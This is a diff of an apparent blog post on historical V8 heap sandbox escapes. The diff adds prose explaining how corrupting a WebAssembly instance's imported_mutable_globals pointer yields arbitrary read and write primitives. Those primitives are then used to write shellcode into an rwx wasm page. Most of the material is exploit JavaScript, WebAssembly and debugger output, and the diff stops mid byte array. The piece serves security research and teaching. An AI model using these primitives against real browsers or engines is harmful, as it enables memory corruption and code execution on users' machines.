@@ -137,6 +137,9 @@ Exploring Historical V8 Heap Sandbox Escapes I &ndash; Anvbis
 </span><span class=c1></span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>incGlobal</span><span class=p>();</span>
 <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>getGlobal</span><span class=p>());</span> <span class=c1>// 1
 </span></code></pre></div><h2 id=corrupting-the-imported-mutable-globals-pointer>Corrupting the Imported Mutable Globals Pointer</h2>
+<p>So what happens if we decide to corrupt the <code>imported_mutable_globals</code> pointer? Well it appears to
+be a external pointer (i.e. outside of the heap), so logically we should be able to read or modify
+an arbitrary location in memory.</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>instance</span><span class=p>);</span>
 <span class=o>%</span><span class=nx>SystemBreak</span><span class=p>();</span>
 
@@ -149,7 +152,10 @@ Exploring Historical V8 Heap Sandbox Escapes I &ndash; Anvbis
 ...
  - imported_mutable_globals: 0x55afdf05e3e0
 ...
-</code></pre><pre><code>pwndbg&gt; x/gx 0x55afdf05e3e0
+</code></pre><p>When reading from the first entry in <code>imported_mutable_globals</code> we can see it holds a value of <code>0</code>.
+Continuing so the <code>incGlobal</code> function is called, we can see that this value has been updated to
+<code>1</code>. Which is what we&rsquo;d expect.</p>
+<pre><code>pwndbg&gt; x/gx 0x55afdf05e3e0
 0x55afdf05e3e0:	0x00001f8500001000
 pwndbg&gt; x/gx 0x00001f8500001000
 0x1f8500001000:	0x0000000000000000
@@ -158,14 +164,22 @@ Continuing.
 
 pwndbg&gt; x/gx 0x00001f8500001000
 0x1f8500001000:	0x0000000000000001
-</code></pre><pre><code>pwndbg&gt; set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
+</code></pre><p>Let&rsquo;s see what happens when we completely corrupt the first pointer in the
+<code>imported_mutable_globals</code> table. That is, not the <code>imported_mutable_globals</code> pointer itself,
+but the first entry within it.</p>
+<pre><code>pwndbg&gt; set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
 pwndbg&gt; x/gx 0x56394c0dc3d0
 0x56394c0dc3d0:	0x4141414141414141
 pwndbg&gt; c
 Continuing.
 
 Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.
-</code></pre><pre><code> ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
+</code></pre><p>We receive a segmentation fault when trying to read from the location in memory we specified. In
+the disassembly below, the next step was to incremement the value retrieved by <code>1</code>, before later
+storing it back into the location in memory it was retrieved from.</p>
+<p>This is exactly the behaviour we&rsquo;d expect to see from a function that increments a global
+variable.</p>
+<pre><code> ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
    0x2d0f6f7876a4    add    ecx, 1
    0x2d0f6f7876a7    mov    rax, qword ptr [rsi + 0x57]
    0x2d0f6f7876ab    mov    rax, qword ptr [rax]
@@ -173,6 +187,13 @@ Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.
 </code></pre><pre><code>pwndbg&gt; p/x $rax
 $1 = 0x4141414141414141
 </code></pre><h2 id=an-arbitrary-read-primitive>An Arbitrary Read Primitive</h2>
+<p>So the question becomes, how do we turn this functionality into arbitrary read or write
+primitives?</p>
+<p>Well, from observing the behaviour above, it would likely involve the corruption of one primary
+value; that of the <code>imported_mutable_globals</code> pointer. But this value doesn&rsquo;t point directly to
+the global variable that is modified - so we&rsquo;d need to point it to an area of memory we control
+and store a pointer to the memory we want to modify at that location.</p>
+<p>The below web-assembly will read a 64-bit value from a mutable global variable.</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-clojure data-lang=clojure><span class=p>(</span><span class=nf>module</span>
   <span class=p>(</span><span class=nf>global</span> <span class=nv>$g</span> <span class=p>(</span><span class=nb>import </span><span class=s>&#34;js&#34;</span> <span class=s>&#34;global&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>mut</span> <span class=nv>i64</span><span class=p>))</span>
   <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;read&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>result</span> <span class=nv>i64</span><span class=p>)</span>
@@ -192,8 +213,12 @@ $1 = 0x4141414141414141
 <span class=kd>let</span> <span class=nx>instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>module</span><span class=p>,</span> <span class=p>{</span>
   <span class=nx>js</span><span class=o>:</span> <span class=p>{</span> <span class=nx>global</span> <span class=p>}</span>
 <span class=p>});</span>
-
-<span class=kd>let</span> <span class=nx>heap</span> <span class=o>=</span> <span class=p>(</span><span class=nx>weak_read</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>;</span>
+</code></pre></div><p>As mentioned above, the primary objective we need to achieve is control over the
+<code>imported_mutable_globals</code> table. I did this by simply pointing it to the elements store of
+a float array. This way the entries within the table could easily be replaced.</p>
+<p>If we want to replace this value with a location on the heap, this will also require a heap
+address leak (which is easily obtained).</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>heap</span> <span class=o>=</span> <span class=p>(</span><span class=nx>weak_read</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>;</span>
 <span class=kd>let</span> <span class=nx>store</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
 <span class=kd>let</span> <span class=nx>elements</span> <span class=o>=</span> <span class=nx>heap</span> <span class=o>+</span> <span class=p>(</span><span class=nx>weak_read</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>store</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>);</span>
 <span class=nx>weak_write</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>instance</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x58</span><span class=p>,</span> <span class=nx>elements</span> <span class=o>+</span> <span class=mi>8</span><span class=nx>n</span> <span class=o>-</span> <span class=mi>1</span><span class=nx>n</span><span class=p>);</span>
@@ -206,11 +231,16 @@ $1 = 0x4141414141414141
 ...
 pwndbg&gt; p/x $rax
 $1 = 0xdeadbeef
-</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_read</span> <span class=o>=</span> <span class=nx>p</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</code></pre><p>This is easily extracted out into a function. A pointer is provided and stored in the controlled
+<code>imported_mutable_globals</code> table, and a value is read from it.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_read</span> <span class=o>=</span> <span class=nx>p</span> <span class=p>=&gt;</span> <span class=p>{</span>
   <span class=nx>store</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>utof</span><span class=p>(</span><span class=nx>p</span><span class=p>);</span>
   <span class=k>return</span> <span class=nx>itou</span><span class=p>(</span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>read</span><span class=p>());</span>
 <span class=p>};</span>
 </code></pre></div><h2 id=an-arbitrary-write-primitive>An Arbitrary Write Primitive</h2>
+<p>The arbitrary write primitive is implemented in an almost identical manner to the read primitive.
+However, a new web-assembly function is introduced that writes a 64-bit integer to the global
+variable.</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-clojure data-lang=clojure><span class=p>(</span><span class=nf>module</span>
   <span class=p>(</span><span class=nf>global</span> <span class=nv>$g</span> <span class=p>(</span><span class=nb>import </span><span class=s>&#34;js&#34;</span> <span class=s>&#34;global&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>mut</span> <span class=nv>i64</span><span class=p>))</span>
   <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;read&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>result</span> <span class=nv>i64</span><span class=p>)</span>
@@ -220,11 +250,18 @@ $1 = 0xdeadbeef
     <span class=p>(</span><span class=nf>global.set</span> <span class=nv>$g</span> <span class=p>(</span><span class=nf>local.get</span> <span class=nv>$p</span><span class=p>))</span>
   <span class=p>)</span>
 <span class=p>)</span>
-</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_write</span> <span class=o>=</span> <span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</code></pre></div><p>You can see how similar it is to the read primitive. It uses the same logic to replaced the
+pointer to the location in memory we want to modify.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_write</span> <span class=o>=</span> <span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
   <span class=nx>store</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>utof</span><span class=p>(</span><span class=nx>p</span><span class=p>);</span>
   <span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
 <span class=p>};</span>
 </code></pre></div><h2 id=code-execution>Code Execution</h2>
+<p>In order to achieve code execution we don&rsquo;t actually require the arbitrary read primitive. All the
+values we need to leak are already stored on the heap.</p>
+<p>The arbitrary write primitive however, is extremely useful. In the code below, it is used to write
+shellcode to the <code>rwx</code> page allocated by a wasm instance object. This, of course, is a very well
+documented technique used to achieve code execution in V8.</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=mi>_</span><span class=nx>wasm</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
   <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span>
   <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
